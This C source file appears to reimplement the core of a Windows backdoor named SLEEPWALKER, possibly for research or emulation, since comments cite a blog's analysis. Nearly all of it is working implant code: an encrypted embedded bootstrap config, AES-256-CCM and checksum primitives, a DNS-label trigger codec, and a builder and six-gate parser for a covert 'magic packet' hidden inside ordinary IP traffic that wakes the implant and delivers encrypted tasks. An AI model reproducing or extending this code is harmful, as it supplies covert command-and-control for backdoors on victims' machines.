/*
 * sw_core.c - pure-C SLEEPWALKER. Compiles both natively (host unit
 * tests) and as part of the Windows DLL.
 *
 * Contains:
 *   - globals: stop flag, 128 KB staging area, embedded config block
 *   - wire-format helpers (length-prefixed fields)
 *   - AES-256-CCM / SHA-256 / CRC-32 / CRC-8 / Base32 primitives
 *   - the magic-packet framing (build + check)
 *   - the DNS-label trigger codec
 *   - the embedded bootstrap decoder
 *
 * Windows-only code (DllMain, the 7 dpapi export stubs, the raw socket
 * sniffer, VirtualProtect, named pipes, registry) lives in sw_win32.c.
 */
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include "sw_core.h"
#include "sw_impl.h"

/* ------------------------------------------------------------------ */
/* Globals                                                             */
/* ------------------------------------------------------------------ */
volatile LONG sw_stop_flag = 0;
uint8_t  sw_stage_arena[SW_STAGE_ARENA_SIZE];
uint32_t sw_stage_arena_len = 0;

/* The 2048-byte bootstrap block. For the DLL, build/gen_bootstrap.py
 * emits a fully-initialized array via -include (config.hex) and defines
 * HAVE_SW_CONFIG_BLOCK; for the native unit-test build it is zeroed, so
 * sw_decrypt_bootstrap simply decodes an empty (all-zero) task. */
#ifndef HAVE_SW_CONFIG_BLOCK
const uint8_t  g_config_block[2048];
#endif
#ifndef HAVE_SW_CONFIG_BLOCK_LEN
const uint32_t g_config_block_len = 2048;
#endif

/* ------------------------------------------------------------------ */
/* Wire format                                                         */
/* ------------------------------------------------------------------ */
int sw_read_u8(sw_reader *r,   uint8_t  *out) {
    if (r->p + 1 > r->end) return -1;
    *out = *r->p++;
    return 0;
}
int sw_read_u16(sw_reader *r,  uint16_t *out) {
    if (r->p + 2 > r->end) return -1;
    *out = (uint16_t)((r->p[0] << 8) | r->p[1]);
    r->p += 2;
    return 0;
}
int sw_read_u32(sw_reader *r,  uint32_t *out) {
    if (r->p + 4 > r->end) return -1;
    *out = (uint32_t)((uint32_t)r->p[0] << 24) | (uint32_t)r->p[1] << 16
         | (uint32_t)r->p[2] << 8 | (uint32_t)r->p[3];
    r->p += 4;
    return 0;
}
int sw_read_u64(sw_reader *r,  uint64_t *out) {
    if (r->p + 8 > r->end) return -1;
    uint64_t v = 0;
    for (int i = 0; i < 8; i++) v = (v << 8) | r->p[i];
    r->p += 8;
    *out = v;
    return 0;
}
int sw_read_varlen(sw_reader *r, uint32_t *out_len, const uint8_t **out_data) {
    const uint8_t *p = r->p;
    const uint8_t *end = r->end;
    uint32_t len = 0;
    int shift = 0;
    do {
        if (p >= end) return -1;
        uint8_t b = *p++;
        len |= (uint32_t)(b & 0x7F) << shift;
        shift += 7;
        if (shift >= 35) {
            r->p = p;
            *out_len = len;
            if (out_data) *out_data = r->p;
            if ((uintptr_t)r->p + len > (uintptr_t)r->end) return -1;
            r->p += len;
            return 0;
        }
        if (!(b & 0x80)) break;
    } while (1);
    r->p = p;
    if ((uintptr_t)r->p + len > (uintptr_t)r->end) return -1;
    *out_len = len;
    if (out_data) *out_data = r->p;
    r->p += len;
    return 0;
}
int sw_read_string(sw_reader *r, char *dst, size_t dst_cap, uint32_t *out_len) {
    const uint8_t *data;
    uint32_t len;
    if (sw_read_varlen(r, &len, &data)) return -1;
    if (dst_cap < (size_t)len + 1) return -1;
    memcpy(dst, data, len);
    dst[len] = '\0';
    if (out_len) *out_len = len;
    return 0;
}
int sw_read_blob(sw_reader *r, const uint8_t **out_data, uint32_t *out_len) {
    return sw_read_varlen(r, out_len, out_data);
}

static void put_be(uint8_t *out, size_t *pos, uint64_t v, int n) {
    for (int i = n - 1; i >= 0; i--) out[(*pos)++] = (uint8_t)((v >> (8*i)) & 0xFF);
}
void sw_write_u16(uint8_t *out, size_t *pos, uint16_t v) { put_be(out, pos, v, 2); }
void sw_write_u32(uint8_t *out, size_t *pos, uint32_t v) { put_be(out, pos, v, 4); }
void sw_write_u64(uint8_t *out, size_t *pos, uint64_t v) { put_be(out, pos, v, 8); }

void sw_write_varlen(uint8_t *out, size_t *pos, uint32_t v) {
    uint32_t carry = v;
    do {
        uint8_t b = (uint8_t)(carry & 0x7F);
        carry >>= 7;
        if (carry) b |= 0x80;
        out[(*pos)++] = b;
    } while (carry);
}
void sw_write_string(uint8_t *out, size_t *pos, const char *s) {
    if (!s) s = "";
    size_t n = 0;
    while (s[n]) n++;
    sw_write_varlen(out, pos, (uint32_t)n);
    for (size_t i = 0; i < n; i++) out[(*pos)++] = (uint8_t)s[i];
}
void sw_write_blob(uint8_t *out, size_t *pos, const uint8_t *data, uint32_t len) {
    sw_write_varlen(out, pos, len);
    if (data) for (uint32_t i = 0; i < len; i++) out[(*pos)++] = data[i];
}

/* ------------------------------------------------------------------ */
/* AES-256-CCM (FIPS 197 block cipher, SP 800-38C CCM, no aad)         */
/* ------------------------------------------------------------------ */
static const uint8_t SBOX[256] = {
 0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
 0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
 0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
 0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
 0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
 0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
 0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
 0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
 0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
 0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
 0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
 0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
 0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
 0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
 0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
 0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
};
static const uint8_t RCON[14] = {
 0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36,0x6c,0xd8,0xab,0x4d
};

static uint32_t s_w[60];
static int s_ke_init = 0;

static uint32_t rotw(uint32_t x) { return (x << 8) | (x >> 24); }
static uint32_t subw(uint32_t x) {
    return  ((uint32_t)SBOX[(x >> 24) & 0xFF] << 24)
          | ((uint32_t)SBOX[(x >> 16) & 0xFF] << 16)
          | ((uint32_t)SBOX[(x >> 8)  & 0xFF] << 8)
          |  (uint32_t)SBOX[x & 0xFF];
}
static uint32_t be32w(const uint8_t *k) {
    return ((uint32_t)k[0] << 24) | ((uint32_t)k[1] << 16)
         | ((uint32_t)k[2] << 8) | (uint32_t)k[3];
}

static void sw_key_schedule_from(const uint8_t *key) {
    for (int i = 0; i < 8; i++)
        s_w[i] = be32w(key + 4*i);
    for (int i = 8; i < 60; i++) {
        uint32_t t = s_w[i-1];
        if (i % 8 == 0)
            t = subw(rotw(t)) ^ ((uint32_t)RCON[i/8 - 1] << 24);
        else if (i % 8 == 4)
            t = subw(t);
        s_w[i] = s_w[i-8] ^ t;
    }
    s_ke_init = 1;
}

static void sw_key_schedule(void) {
    sw_key_schedule_from(SW_AES_KEY());
}

#define XTIME(a) (uint8_t)(((a) << 1) ^ (((a) & 0x80) ? 0x1B : 0))

/* MixColumns multiplication by 3 in GF(2^8). */
#define MUL3(a) ((uint8_t)(XTIME(a) ^ (a)))

static void sw_aes16(const uint8_t in[16], uint8_t out[16]) {
    if (!s_ke_init) sw_key_schedule();
    uint8_t st[4][4];   /* st[row][col] */
    uint8_t wrd[4];
    for (int c = 0; c < 4; c++)
        for (int r = 0; r < 4; r++)
            st[r][c] = in[4 * c + r];

    /* Initial AddRoundKey (round 0) */
    for (int c = 0; c < 4; c++) {
        uint32_t w = s_w[c];
        for (int r = 0; r < 4; r++)
            st[r][c] ^= (uint8_t)(w >> (24 - 8 * r));
    }

    for (int round = 1; round < 15; round++) {
        /* SubBytes */
        for (int c = 0; c < 4; c++)
            for (int r = 0; r < 4; r++)
                st[r][c] = SBOX[st[r][c]];

        /* ShiftRows: row r rotated left by r */
        for (int r = 1; r < 4; r++) {
            for (int c = 0; c < 4; c++) wrd[c] = st[r][c];
            for (int c = 0; c < 4; c++) st[r][c] = wrd[(c + r) % 4];
        }

        /* MixColumns (not on the final round, 14) */
        if (round != 14) {
            for (int c = 0; c < 4; c++) {
                uint8_t a0 = st[0][c], a1 = st[1][c];
                uint8_t a2 = st[2][c], a3 = st[3][c];
                st[0][c] = XTIME(a0) ^ MUL3(a1) ^ a2 ^ a3;
                st[1][c] = a0 ^ XTIME(a1) ^ MUL3(a2) ^ a3;
                st[2][c] = a0 ^ a1 ^ XTIME(a2) ^ MUL3(a3);
                st[3][c] = MUL3(a0) ^ a1 ^ a2 ^ XTIME(a3);
            }
        }

        /* AddRoundKey */
        for (int c = 0; c < 4; c++) {
            uint32_t w = s_w[round * 4 + c];
            for (int r = 0; r < 4; r++)
                st[r][c] ^= (uint8_t)(w >> (24 - 8 * r));
        }
    }
    for (int c = 0; c < 4; c++)
        for (int r = 0; r < 4; r++)
            out[4 * c + r] = st[r][c];
}

/*
 * AES-256-CCM - SP 800-38C Counter with CBC-MAC, no associated data.
 *
 * Nonce must be 7..13 bytes.  Standard CCM construction (flags byte,
 * CBC-MAC over the formatted plaintext, CTR-mode encryption with the
 * tag masked by S0).  This is the construction mbedTLS / the real
 * SLEEPWALKER uses, so a message sealed here decrypts with any standard
 * CCM implementation using the same key, and vice versa.
 *
 *   seal(pt) -> ct, tag      tag = S0 ^ CBC_MAC(B0 || pt), truncated
 *   open(ct) -> pt, tag      tag = S0 ^ CBC_MAC(B0 || pt), truncated
 *
 * Callers verify by recomputing the tag over the recovered plaintext and
 * comparing it to the stored tag.
 */
static void ccm_incr(uint8_t ctr[16], uint32_t L) {
    for (int i = 15; i >= 16 - (int)L; i--) {
        if (++ctr[i] != 0) break;
    }
}

/* Build a CCM block: flags | nonce | value(L bytes big-endian). */
static void ccm_block_format(uint8_t out[16], const uint8_t *nonce,
                             uint32_t nonce_len, uint32_t L,
                             uint32_t flags, uint64_t value) {
    memset(out, 0, 16);
    out[0] = (uint8_t)flags;
    memcpy(out + 1, nonce, nonce_len);
    for (uint32_t i = 0; i < L; i++)
        out[1 + nonce_len + i] = (uint8_t)(value >> (8 * (L - 1 - i)));
}

int sw_aes256_ccm_seal(const uint8_t *nonce, uint32_t nonce_len,
                       const uint8_t *pt, uint32_t pt_len,
                       uint8_t *ct, uint8_t *tag, uint32_t tag_len) {
    if (tag_len < 4 || tag_len > 16 || (tag_len & 1)) return -1;
    if (nonce_len < 7 || nonce_len > 13) return -1;
    uint32_t L = 15 - nonce_len;
    if (L < 4 && pt_len >= (1u << (8 * L))) return -1;

    /* B0 = flags | nonce | length;  CBC-MAC over B0 then each plaintext block. */
    uint8_t b0[16];
    uint32_t flags = (uint32_t)((L - 1) | (((tag_len - 2) / 2) << 3));
    ccm_block_format(b0, nonce, nonce_len, L, flags, pt_len);
    uint8_t x[16];
    sw_aes16(b0, x);
    uint32_t off = 0;
    while (off < pt_len) {
        uint8_t b[16] = {0};
        uint32_t n = (pt_len - off < 16) ? pt_len - off : 16;
        memcpy(b, pt + off, n);
        for (int i = 0; i < 16; i++) b[i] ^= x[i];
        sw_aes16(b, x);
        off += 16;
    }
    uint8_t mac[16];
    memcpy(mac, x, 16);

    /* A0 = flags(0) | nonce | counter(0);  S0 masks the tag. */
    uint8_t a0[16];
    ccm_block_format(a0, nonce, nonce_len, L, (L - 1), 0);
    uint8_t s0[16];
    sw_aes16(a0, s0);

    /* CTR counter starts at 1 for the ciphertext. */
    uint8_t ctr[16];
    memcpy(ctr, a0, 16);
    ccm_incr(ctr, L);
    off = 0;
    while (off < pt_len) {
        uint8_t s[16];
        sw_aes16(ctr, s);
        uint32_t n = (pt_len - off < 16) ? pt_len - off : 16;
        for (uint32_t i = 0; i < n; i++) ct[off + i] = pt[off + i] ^ s[i];
        off += 16;
        ccm_incr(ctr, L);
    }
    for (uint32_t i = 0; i < tag_len; i++) tag[i] = s0[i] ^ mac[i];
    return 0;
}

int sw_aes256_ccm_open(const uint8_t *nonce, uint32_t nonce_len,
                       const uint8_t *ct, uint32_t ct_len,
                       uint8_t *pt, uint8_t *tag, uint32_t tag_len) {
    if (tag_len < 4 || tag_len > 16 || (tag_len & 1)) return -1;
    if (nonce_len < 7 || nonce_len > 13) return -1;
    uint32_t L = 15 - nonce_len;

    /* A0 and S0 */
    uint8_t a0[16];
    ccm_block_format(a0, nonce, nonce_len, L, (L - 1), 0);
    uint8_t s0[16];
    sw_aes16(a0, s0);

    /* Decrypt */
    uint8_t ctr[16];
    memcpy(ctr, a0, 16);
    ccm_incr(ctr, L);
    uint32_t off = 0;
    while (off < ct_len) {
        uint8_t s[16];
        sw_aes16(ctr, s);
        uint32_t n = (ct_len - off < 16) ? ct_len - off : 16;
        for (uint32_t i = 0; i < n; i++) pt[off + i] = ct[off + i] ^ s[i];
        off += 16;
        ccm_incr(ctr, L);
    }

    /* CBC-MAC over B0 + recovered plaintext */
    uint8_t b0[16];
    uint32_t flags = (uint32_t)((L - 1) | (((tag_len - 2) / 2) << 3));
    ccm_block_format(b0, nonce, nonce_len, L, flags, ct_len);
    uint8_t x[16];
    sw_aes16(b0, x);
    off = 0;
    while (off < ct_len) {
        uint8_t b[16] = {0};
        uint32_t n = (ct_len - off < 16) ? ct_len - off : 16;
        memcpy(b, pt + off, n);
        for (int i = 0; i < 16; i++) b[i] ^= x[i];
        sw_aes16(b, x);
        off += 16;
    }
    for (uint32_t i = 0; i < tag_len; i++) tag[i] = s0[i] ^ x[i];
    return 0;
}

/* ------------------------------------------------------------------ */
/* SHA-256                                                            */
/* ------------------------------------------------------------------ */
#include "sw_sha256.h"
#define KSHA SW_KSHA
#define ROTR(x,n) (((x) >> (n)) | ((x) << ((32 - (n)) & 31)))
static uint32_t be32b(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16)
         | ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}
static void put_be32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24); p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);  p[3] = (uint8_t)v;
}

static void sha256_compress(uint32_t h[8], const uint8_t blk[64]) {
    uint32_t w[64];
    for (int i = 0; i < 16; i++) w[i] = be32b(blk + 4*i);
    for (int i = 16; i < 64; i++) {
        uint32_t s0 = ROTR(w[i-15],7) ^ ROTR(w[i-15],18) ^ (w[i-15] >> 3);
        uint32_t s1 = ROTR(w[i-2],17) ^ ROTR(w[i-2],19) ^ (w[i-2] >> 10);
        w[i] = w[i-16] + s0 + w[i-7] + s1;
    }
    uint32_t a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],hh=h[7];
    for (int i = 0; i < 64; i++) {
        uint32_t S1 = ROTR(e,6) ^ ROTR(e,11) ^ ROTR(e,25);
        uint32_t ch = (e & f) ^ (~e & g);
        uint32_t t1 = hh + S1 + ch + KSHA[i] + w[i];
        uint32_t S0 = ROTR(a,2) ^ ROTR(a,13) ^ ROTR(a,22);
        uint32_t maj = (a & b) ^ (a & c) ^ (b & c);
        uint32_t t2 = S0 + maj;
        hh=g; g=f; f=e; e=d+t1; d=c; c=b; b=a; a=t1+t2;
    }
    h[0]+=a; h[1]+=b; h[2]+=c; h[3]+=d; h[4]+=e; h[5]+=f; h[6]+=g; h[7]+=hh;
}

void sw_sha256(const uint8_t *data, uint32_t len, uint8_t digest[32]) {
    uint32_t h[8] = {
        0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,
        0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19
    };
    uint64_t total_bits_u64 = (uint64_t)(len) * 8u;
    uint32_t hi = (uint32_t)((total_bits_u64 >> 32) & 0xFFFFFFFFu);
    uint32_t lo = (uint32_t)(total_bits_u64 & 0xFFFFFFFFu);

    /* Consume full 64-byte blocks. */
    uint32_t i = 0;
    while (i + 64 <= len) { sha256_compress(h, data + i); i += 64; }
    uint32_t tail = len - i;

    /* Padding: 0x80, then zeros up to position 56 (or to a fresh 64-byte
     * block), then the 64-bit big-endian bit count. */
    uint8_t pad[128+1]; memset(pad, 0, sizeof(pad));
    if (tail < 64) memcpy(pad, data + i, tail);
    pad[tail] = 0x80;
    if (tail >= 56) {
        /* Pad the current block out, compress, then a fresh block for the
         * 64-bit bit length. */
        sha256_compress(h, pad);
        uint8_t lenblk[64]; memset(lenblk, 0, sizeof(lenblk));
        put_be32(lenblk + 56, hi);
        put_be32(lenblk + 60, lo);
        sha256_compress(h, lenblk);
    } else {
        put_be32(pad + 56, hi);
        put_be32(pad + 60, lo);
        sha256_compress(h, pad);
    }
    for (int n = 0; n < 8; n++) put_be32(digest + 4*n, h[n]);
}

/* ------------------------------------------------------------------ */
/* CRC-32 / CRC-8                                                      */
/* ------------------------------------------------------------------ */
static uint32_t s_crc32_tab[256];
static int s_crc32_tab_done;
static void sw_crc32_init(void) {
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
        s_crc32_tab[i] = c;
    }
    s_crc32_tab_done = 1;
}
uint32_t sw_crc32(const uint8_t *data, uint32_t len, uint32_t seed) {
    if (!s_crc32_tab_done) sw_crc32_init();
    if (seed == 0xFFFFFFFFu) {
        /* Pre-XOR seed and final-XOR (standard reflected-32 IEEE) */
        uint32_t c = seed;
        for (uint32_t i = 0; i < len; i++)
            c = s_crc32_tab[(c ^ data[i]) & 0xFFU] ^ (c >> 8);
        return c ^ 0xFFFFFFFFu;
    }
    uint32_t c = seed;
    for (uint32_t i = 0; i < len; i++)
        c = s_crc32_tab[(c ^ data[i]) & 0xFFU] ^ (c >> 8);
    return c;
}

static uint8_t s_crc8_tab[256];
static int s_crc8_tab_done;
static void sw_crc8_init(void) {
    for (uint32_t i = 0; i < 256; i++) {
        uint8_t c = (uint8_t)i;
        for (int k = 0; k < 8; k++)
            c = (c & 0x80) ? (uint8_t)((c << 1) ^ 0x31) : (uint8_t)(c << 1);
        s_crc8_tab[i] = c;
    }
    s_crc8_tab_done = 1;
}
uint8_t sw_crc8(const uint8_t *data, uint32_t len) {
    if (!s_crc8_tab_done) sw_crc8_init();
    uint8_t c = 0;
    for (uint32_t i = 0; i < len; i++) c = s_crc8_tab[c ^ data[i]];
    return c;
}

/* ------------------------------------------------------------------ */
/* Base32 (RFC 4648 lower-case, no padding)                            */
/* ------------------------------------------------------------------ */
static const char B32_ALPHA[] = "abcdefghijklmnopqrstuvwxyz234567";

int sw_base32_encode(const uint8_t *in, uint32_t in_len, char *out, uint32_t cap) {
    uint32_t buf = 0, bits = 0, o = 0;
    for (uint32_t i = 0; i < in_len; i++) {
        buf = (buf << 8) | in[i];
        bits += 8;
        while (bits >= 5 && o < cap) {
            uint32_t c = (buf >> (bits - 5)) & 0x1F;
            bits -= 5;
            out[o++] = B32_ALPHA[c];
        }
    }
    if (bits > 0 && o < cap) {
        uint32_t c = (buf << (5 - bits)) & 0x1F;
        out[o++] = B32_ALPHA[c];
    }
    if (o < cap) out[o] = '\0';
    return (int)o;
}
static int b32_idx(char c) {
    if (c >= 'a' && c <= 'z') return c - 'a';
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= '2' && c <= '7') return c - '2' + 26;
    return -1;
}
int sw_base32_decode(const char *in, uint32_t in_len, uint8_t *out, uint32_t cap, uint32_t *out_len) {
    uint32_t buf = 0, bits = 0, o = 0;
    for (uint32_t i = 0; i < in_len; i++) {
        int v = b32_idx(in[i]);
        if (v < 0) return -1;
        buf = (buf << 5) | (uint32_t)v;
        bits += 5;
        while (bits >= 8 && o < cap) {
            bits -= 8;
            out[o++] = (uint8_t)((buf >> bits) & 0xFF);
        }
        buf &= (bits ? (1u << bits) - 1u : 0u);
    }
    if (out_len) *out_len = o;
    return 0;
}

/* ------------------------------------------------------------------ */
/* DNS label codec                                                     */
/* ------------------------------------------------------------------ */
/*
 * DNS label format: marker_hi | base32(envelope) | marker_lo
 *
 * The two markers are NOT fixed letters.  Between them they carry a
 * single CRC-8 checksum (poly 0x31, seed 0, over the middle characters
 * only).  The resulting byte is split in half: the top four bits become
 * the first marker and the bottom four bits the last, each added to the
 * letter 'g'.  Four bits hold sixteen values, so both markers always
 * land between 'g' and 'v' - checking that range is the first thing the
 * decoder does, so ordinary labels cost almost nothing to reject.
 *
 * The blog's worked example: base32("qfoceywmw4etcjdp2nptiti") has
 * CRC-8 0x65, giving markers 'm' (6) and 'l' (5).
 */
#define SW_DNS_MARKER_BASE 'g'   /* 'g' + nibble */

int sw_dns_label_encode(const uint8_t *envelope, uint32_t len, char *out, uint32_t cap) {
    char mid[256];
    int ml = sw_base32_encode(envelope, len, mid, sizeof(mid));
    if (ml < 0) return -1;
    if ((uint32_t)(ml + 2) > cap) return -1;
    uint8_t crc = sw_crc8((const uint8_t *)mid, (uint32_t)ml);
    out[0]      = (char)(SW_DNS_MARKER_BASE + (crc >> 4));
    memcpy(out + 1, mid, (size_t)ml);
    out[1 + ml] = (char)(SW_DNS_MARKER_BASE + (crc & 0x0F));
    out[1 + ml + 1] = '\0';
    return ml + 2;
}
int sw_dns_label_decode(const char *label, uint32_t len, uint8_t *out, uint32_t cap, uint32_t *out_len) {
    if (len < 4) return 0;
    char hi = label[0], lo = label[len - 1];
    if (hi < 'g' || hi > 'v' || lo < 'g' || lo > 'v') return 0;
    uint32_t mid_len = len - 2;
    uint8_t marker = (uint8_t)(((hi - 'g') << 4) | (lo - 'g'));
    uint8_t crc = sw_crc8((const uint8_t *)label + 1, mid_len);
    if (crc != marker) return 0;
    uint32_t o = 0;
    int rc = sw_base32_decode(label + 1, mid_len, out, cap, &o);
    if (rc < 0) return 0;
    if (out_len) *out_len = o;
    return 1;
}

/* ------------------------------------------------------------------ */
/* Magic packet framing                                                */
/* ------------------------------------------------------------------ */
/*
 * Magic packet framing - the hidden trigger packet (per the post's gate
 * description and the recovered checksum algorithm).
 *
 * The trigger rides inside any IP packet and is validated by six gates in
 * order (a failure at any one drops the packet):
 *
 *   1. packet >= 48 bytes
 *   2. candidate_len = (word[last] ^ word[second-last]) ^ 0xAAAA
 *   3. candidate_len within a valid range (>= 0x1C)
 *   4. byte pair at (packet_len - candidate_len) equals the SUM (not
 *      XOR) of the last two 16-bit words
 *   5. the block the candidate length points to passes its CRC-32
 *   6. the block is an AES-256-CCM envelope that decrypts to a task
 *
 * Layout (P = packet length, E = AES envelope length = 28 + pt_len):
 *
 *   [ prefix padding ][ B-byte block ]
 *   block = [ SUM (2, BE) ][ AES env: nonce12|tag16|ct ][ crc32 (4, BE) ][ w1 (2, BE) ][ w2 (2, BE) ]
 *
 *   B = 2 + E + 4 + 4 = E + 10      (block starts at P - B)
 *   w1 = BE16[P-4], w2 = BE16[P-2]  ->  candidate_len B = (w1 ^ w2) ^ 0xAAAA
 *   SUM marker (block[0..2]) = (w1 + w2) & 0xFFFF
 *   crc32 field (block[2+E .. 2+E+4] = [P-8, P-4)) covers the block except
 *   the crc field: [ SUM | envelope | w1 | w2 ].
 *
 * The builder picks w1 = B ^ 0xAAAA, w2 = 0, so SUM = w1 and every gate is
 * satisfied by construction.
 */
static uint16_t rd16(const uint8_t *p) {
    return (uint16_t)((p[0] << 8) | p[1]);
}
static void wr16(uint8_t *p, uint16_t v) {
    p[0] = (uint8_t)(v >> 8); p[1] = (uint8_t)v;
}
static uint32_t rd32(const uint8_t *p) {
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16)
         | ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}
static void wr32(uint8_t *p, uint32_t v) {
    p[0] = (uint8_t)(v >> 24); p[1] = (uint8_t)(v >> 16);
    p[2] = (uint8_t)(v >> 8);  p[3] = (uint8_t)v;
}

#define SW_MAGIC_MIN_BLOCK  0x1C   /* 28: minimum candidate length (gate 3) */
#define SW_MAGIC_MAX_BLOCK  2048

int sw_magic_packet_build(const uint8_t *pt, uint32_t pt_len,
                          uint8_t *out, uint32_t out_cap, uint32_t *out_len) {
    uint32_t env_len = 28 + pt_len;
    uint32_t B = env_len + 10;             /* block length == candidate length */
    /* The receiver's block limit (SW_MAGIC_MAX_BLOCK) is 2048 and the stack
     * buffers below are 2048 bytes: the block (2 SUM + env + 4 CRC) must fit
     * in both. B = env_len + 10, so cap env_len so the receiver would accept
     * it and the local buffers do not overflow. */
    if (B > SW_MAGIC_MAX_BLOCK || B > out_cap) return -1;
    (void)env_len;

    /* Envelope: nonce12 | tag16 | ct */
    uint8_t env[2048];
    uint8_t nonce[12], tag[16];
    for (int i = 0; i < 12; i++)
        nonce[i] = (uint8_t)(sw_random_u32() >> ((i & 3) * 8));
    if (sw_aes256_ccm_seal(nonce, 12, pt, pt_len, env + 28, tag, 16) != 0)
        return -1;
    memcpy(env, nonce, 12);
    memcpy(env + 12, tag, 16);

    /* Trailing words + SUM so all length/SUM gates hold by construction. */
    uint16_t w1 = (uint16_t)((B ^ SW_SNIFF_XOR_CONST) & 0xFFFF);
    uint16_t w2 = 0;
    uint16_t sum = (uint16_t)(w1 + w2);

    /* CRC over the block except the crc field: SUM | env | w1 | w2. */
    uint8_t body[2048];
    wr16(body, sum);
    memcpy(body + 2, env, env_len);
    wr16(body + 2 + env_len, w1);
    wr16(body + 2 + env_len + 2, w2);
    uint32_t crc = sw_crc32(body, 2 + env_len + 4, 0);

    /* Packet = [ prefix ][ block B bytes ]; block sits at the end. */
    uint32_t need = SW_SNIFF_MIN_PACKET > B ? SW_SNIFF_MIN_PACKET - B : 0;
    uint8_t *prefix = out;
    uint8_t *block = out + need;
    memset(prefix, 0, need);
    wr16(block, sum);
    memcpy(block + 2, env, env_len);
    wr32(block + 2 + env_len, crc);
    wr16(block + 2 + env_len + 4, w1);
    wr16(block + 2 + env_len + 6, w2);

    if (out_len) *out_len = need + B;
    return 0;
}

int sw_magic_packet_check(const uint8_t *pkt, uint32_t pkt_len,
                          uint8_t *task, uint32_t task_cap, uint32_t *task_len) {
    /* Gate 1: minimum length */
    if (pkt_len < SW_SNIFF_MIN_PACKET) return 0;
    /* Gate 2: candidate length from the trailing words */
    uint16_t w1 = rd16(pkt + pkt_len - 4);
    uint16_t w2 = rd16(pkt + pkt_len - 2);
    uint32_t B = (uint32_t)((w1 ^ w2) ^ SW_SNIFF_XOR_CONST) & 0xFFFF;
    /* Gate 3: valid range */
    if (B < SW_MAGIC_MIN_BLOCK || B > SW_MAGIC_MAX_BLOCK) return 0;
    /* Gate 4: byte pair at (packet_len - candidate_len) == SUM of words */
    if (rd16(pkt + pkt_len - B) != (uint16_t)(w1 + w2)) return 0;
    /* Gate 5: CRC-32 of the block (excluding the crc field at [P-8, P-4)) */
    uint32_t env_len = B - 10;
    if (env_len < 28) return 0;
    uint32_t crc = sw_crc32(pkt + pkt_len - B, B - 8, 0);  /* SUM + envelope */
    crc = sw_crc32(pkt + pkt_len - 4, 4, crc);             /* w1 + w2 */
    if (rd32(pkt + pkt_len - 8) != crc) return 0;
    /* Gate 6: AES-256-CCM decrypt of the envelope */
    const uint8_t *env = pkt + pkt_len - B + 2;
    const uint8_t *nonce = env;
    const uint8_t *tag = env + 12;
    const uint8_t *ct = env + 28;
    uint32_t ct_len = env_len - 28;
    if (ct_len > task_cap) return 0;
    uint8_t check[16];
    if (sw_aes256_ccm_open(nonce, 12, ct, ct_len, task, check, 16) != 0) return 0;
    if (memcmp(check, tag, 16) != 0) return 0;
    sw_dbg("magic: PASS pkt_len=%u B=%u ct_len=%u", pkt_len, B, ct_len);
    if (task_len) *task_len = ct_len;
    return 1;
}

/* ------------------------------------------------------------------ */
/* Bootstrap decoder                                                   */
/* ------------------------------------------------------------------ */
int sw_decrypt_bootstrap(const uint8_t *block, uint32_t block_len,
                         uint8_t *task, uint32_t task_cap, uint32_t *task_len) {
    if (block_len < 28) return -1;
    const uint8_t *nonce = block;
    const uint8_t *tag   = block + 12;
    const uint8_t *ct    = block + 28;
    uint32_t ct_len = block_len - 28;
    if (ct_len > task_cap) return -1;
    uint8_t check[16];
    if (sw_aes256_ccm_open(nonce, 12, ct, ct_len, task, check, 16) != 0) return -1;
    if (memcmp(check, tag, 16) != 0) return -1;
    if (task_len) *task_len = ct_len;
    return 0;
}

